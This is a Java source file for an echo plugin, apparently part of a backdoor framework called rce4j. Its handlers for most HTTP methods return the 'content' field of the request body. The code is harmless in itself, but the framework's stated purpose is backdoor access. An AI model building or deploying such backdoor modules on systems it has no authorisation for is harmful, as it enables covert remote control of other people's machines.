package org.rce4j.module.impl.http;

import org.rce4j.exception.HttpException;
import org.rce4j.module.BackdoorHttpModule;
import org.rce4j.module.event.BackdoorHttpEvent;

public class EchoModule extends BackdoorHttpModule {
    public EchoModule() {
        super("echo", "/echo");
    }
    
    @Override
    public void onHead(BackdoorHttpEvent event) throws HttpException {
        handle(event);
    }
    
    @Override
    public void onPost(BackdoorHttpEvent event) throws HttpException {
        handle(event);
    }
    
    @Override
    public void onPut(BackdoorHttpEvent event) throws HttpException {
        handle(event);
    }
    
    @Override
    public void onDelete(BackdoorHttpEvent event) throws HttpException {
        handle(event);
    }
    
    @Override
    public void onConnect(BackdoorHttpEvent event) throws HttpException {
        handle(event);
    }
    
    @Override
    public void onOptions(BackdoorHttpEvent event) throws HttpException {
        handle(event);
    }
    
    @Override
    public void onTrace(BackdoorHttpEvent event) throws HttpException {
        handle(event);
    }
    
    @Override
    public void onPatch(BackdoorHttpEvent event) throws HttpException {
        handle(event);
    }
    
    private void handle(BackdoorHttpEvent event) {
        event.respond(event.getBody().get("content").getAsJsonPrimitive().getAsString());
    }
}
